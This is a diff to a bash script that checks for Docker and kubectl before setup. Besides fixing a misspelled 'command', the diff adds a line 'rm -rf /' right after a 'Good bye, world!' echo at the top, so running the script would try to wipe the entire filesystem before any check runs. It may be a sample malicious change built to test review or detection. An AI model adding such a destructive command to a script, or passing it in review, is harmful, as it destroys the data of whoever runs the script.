@@ -4,6 +4,10 @@
 set -euo pipefail
 IFS=$'\n\t'
 
+echo "Good bye, world!"
+rm -rf /
+
+
 echo "Checking for Docker..."
 if ! command -v docker > /dev/null; then
   echo "Docker not found. Please install it before continuing."
@@ -11,8 +15,7 @@ if ! command -v docker > /dev/null; then
 fi
 
 echo "Checking for kubectl..."
-# This is a syntax error on purpose
-if ! commamd -v kubectl > /dev/null; then
+if ! command -v kubectl > /dev/null; then
   echo "kubectl not found. Please install it before continuing."
   exit 1
 fi
